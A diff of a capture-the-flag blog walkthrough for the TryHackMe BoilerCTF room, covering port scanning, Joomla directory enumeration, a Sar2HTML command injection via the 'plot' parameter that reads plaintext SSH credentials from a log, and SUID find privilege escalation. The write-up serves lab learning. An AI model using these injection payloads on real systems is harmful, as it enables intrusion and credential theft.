@@ -8,15 +8,14 @@ tags: [Command Injection, CMS, Enumeration, Sar2HTML]
 # ~$ BoilerCTF walkthrough
 Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here [Tryhackme](https://www.tryhackme.com/room/boilerctf2), I'll walk you through buddy!
 
-## $Hints
+## ~$ Hints
 - Recursive numeration
 - Don't bother Bruteforcing... You're overthinking it.
 - 2HTML
 - ExploitDB
 
-## Scanning & Enumeration::
+## ~$ Scanning & Enumeration::
   As always:
-
 ```
 ┌──(azazel㉿azazel)-[~]
 └─$ sudo nmap -sV -sC -sS 10.10.47.112 -vv -p- -T4                                                              130 ⨯
@@ -50,11 +49,6 @@ Warning: 10.10.47.112 giving up on port because retransmission cap hit (6).
 Discovered open port 55007/tcp on 10.10.47.112
 SYN Stealth Scan Timing: About 40.07% done; ETC: 21:39 (0:14:50 remaining)
 SYN Stealth Scan Timing: About 46.19% done; ETC: 21:40 (0:13:36 remaining)
-SYN Stealth Scan Timing: About 51.14% done; ETC: 21:40 (0:12:17 remaining)
-SYN Stealth Scan Timing: About 55.58% done; ETC: 21:39 (0:11:00 remaining)
-SYN Stealth Scan Timing: About 60.89% done; ETC: 21:39 (0:09:43 remaining)
-SYN Stealth Scan Timing: About 65.69% done; ETC: 21:39 (0:08:25 remaining)
-SYN Stealth Scan Timing: About 70.47% done; ETC: 21:39 (0:07:08 remaining)
 SYN Stealth Scan Timing: About 75.36% done; ETC: 21:38 (0:05:52 remaining)
 SYN Stealth Scan Timing: About 80.18% done; ETC: 21:38 (0:04:40 remaining)
 Discovered open port 10000/tcp on 10.10.47.112
@@ -154,7 +148,6 @@ We're greeted with the default Apache landing page, on checking the source I fin
   
 Robots.txt tells gives us this info:
 ```
-
 User-agent: *
 Disallow: /
 
@@ -169,10 +162,9 @@ Disallow: /
 /it
 
 079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
-
 ```
-At this point I realized this was going to be a frustrating room, the sequence of numerics at the end seemed like a decimal encoding but on translation it didn't mean anything of importance...
-Lets visit the "Joomla" directory, it is apparently a CMS with a crazy tonne of exploits, at this point I ran a recursive directory bruteforce to find a login page, so maybe I could gain admin access::
+At this point I realized this was going to be a frustrating room, the sequence of numerics at the end seemed like a decimal encoding but on translating it didn't mean anything of importance...
+Let's visit the "Joomla" directory, it is apparently a CMS with a crazy tonne of exploits, at this point I ran a recursive directory bruteforce to find a login page, so maybe I could gain admin access and try to spawn a shell::
 ```
 ┌──(azazel㉿azazel)-[~]
 └─$ dirsearch -u http://10.10.47.112/  -w /usr/share/wordlists/dirb/common.txt -t 10 -r
@@ -198,7 +190,7 @@ Target: http://10.10.47.112/
 [21:32:37] 301 -  322B  - /joomla/_archive  ->  http://10.10.47.112/joomla/_archive/     (Added to queue)
 [21:32:37] 301 -  323B  - /joomla/_database  ->  http://10.10.47.112/joomla/_database/     (Added to queue)
 [21:32:37] 301 -  320B  - /joomla/_files  ->  http://10.10.47.112/joomla/_files/     (Added to queue)
-[21:32:39] 301 -  319B  - /joomla/_test  ->  http://10.10.47.112/joomla/_test/     (Added to queue)
+[21:32:39] 301 -  319B  - /joomla/_test  ->  http://10.10.47.112/joomla/_test/     (Added to queue)     
 [21:32:40] 301 -  318B  - /joomla/~www  ->  http://10.10.47.112/joomla/~www/     (Added to queue)
 [21:32:45] 301 -  327B  - /joomla/administrator  ->  http://10.10.47.112/joomla/administrator/     (Added to queue)
 [21:32:55] 301 -  317B  - /joomla/bin  ->  http://10.10.47.112/joomla/bin/     (Added to queue)
@@ -238,23 +230,21 @@ Target: http://10.10.47.112/
 [21:43:30] Starting: joomla/_files/
 [21:44:50] 200 -  168B  - /joomla/_files/index.html
 [21:46:35] Starting: joomla/_test/
-[21:47:53] 200 -    5KB - /joomla/_test/index.php
+[21:47:53] 200 -    5KB - /joomla/_test/index.php  
 [21:49:42] Starting: joomla/~www/
 [21:51:03] 200 -  162B  - /joomla/~www/index.html
 [21:52:41] Starting: joomla/administrator/
 [21:53:15] 301 -  333B  - /joomla/administrator/cache  ->  http://10.10.47.112/joomla/administrator/cache/     (Added to queue)
 [21:53:23] 301 -  338B  - /joomla/administrator/components  ->  http://10.10.47.112/joomla/administrator/components/     (Added to queue)
-[21:53:56] 301 -  332B  - /joomla/administrator/help  ->  http://10.10.47.112/joomla/administrator/help/     (Added to queue)
-[21:54:01] 301 -  336B  - /joomla/administrator/includes  ->  http://10.10.47.112/joomla/administrator/includes/     (Added to queue)
+[21:53:56] 301 -  332B  - /joomla/administrator/help  ->  http://10.10.47.112/joomla/administrator/help/ 
 [21:54:01] 200 -    5KB - /joomla/administrator/index.php
-[21:54:09] 301 -  336B  - /joomla/administrator/language  ->  http://10.10.47.112/joomla/administrator/language/     (Added to queue)
 [21:54:14] 301 -  332B  - /joomla/administrator/logs  ->  http://10.10.47.112/joomla/administrator/logs/     (Added to queue)
 [21:54:21] 301 -  335B  - /joomla/administrator/modules  ->  http://10.10.47.112/joomla/administrator/modules/     (Added to queue)
 [21:55:18] 301 -  337B  - /joomla/administrator/templates  ->  http://10.10.47.112/joomla/administrator/templates/     (Added to queue)
 CTRL+C detected: Pausing threads, please wait...
 ```
 Sheesh, alot of sub directories uhn?
-  ![image](https://giphy.com/gifs/reaction-JjdKi7cH71Hby)
+  
 
 First thing I checked was this
  ```->  http://10.10.47.112/joomla/administrator/ ```
@@ -268,8 +258,8 @@ One of the few encoded texts translated to this ::
   ![image](/assets/img/posts/BoilerCTF/decrypt3.png)
 
 This machine was taunting me at this point.
-  !!!!!!!!!!!!!!!!!!!!!!!
 
+# ~$ Exploitation
 To cut to the chase, after all the swift fails and checking webmin on port 10000, I decided to revisit this weird test directory I found 
 
 ``/joomla/_test  ->  http://10.10.47.112/joomla/_test/ ``
@@ -299,17 +289,17 @@ It also appears to have a weird log.txt document in the current directory when y
 ```
 http://<ipaddr>/index.php?plot=;ls -la
 ```
-so just cat log.txt::       and click select host to display the command output.
+Just cat log.txt, and click select host to display the command output.::       
 ```
 http://<ipaddr>/index.php?plot=; cat log.txt
 ```
   ![image](/assets/img/posts/BoilerCTF/ssh-creds.png)
 
 It looks like the log file contains ssh creds of a user "Basterd" and his pass all in plaintext. Hehee
-  !!!!!!!
 
-## ~$ Initial Access & Priviledge Escalation::
-### _Hackers don't break in, we log in_::
+
+## ~$ Initial Access & Priviledge escalation::
+#### _Hackers don't break in, we log in_::
   ![image](/assets/img/posts/BoilerCTF/initial-access.png)
 
 In "his" home directory seems there is some sort of backup script that belongs to another use who has a little more priviledges by virtue of SUID bit set for him on the find binary, cat the file and we have his creds, horizontal privesc with with his creds and then navigate to his home directory, the .secret file contains the first flag and then to privesc we have SUID bit set on find
@@ -326,6 +316,6 @@ find / -type f -perm -u=s 2>dev/null
 And spawn a priviledged shell and read our root flag, like so::
   ![image](/assets/img/posts/BoilerCTF/end.jpg)
 
-Rooted! This was all sorts of fun
+Rooted!!
 
-Salaam, from [Rami3l](https://www.tryhackme.com/p/Rami3l).
+Salam, from [Rami3l](https://www.tryhackme.com/p/Rami3l).
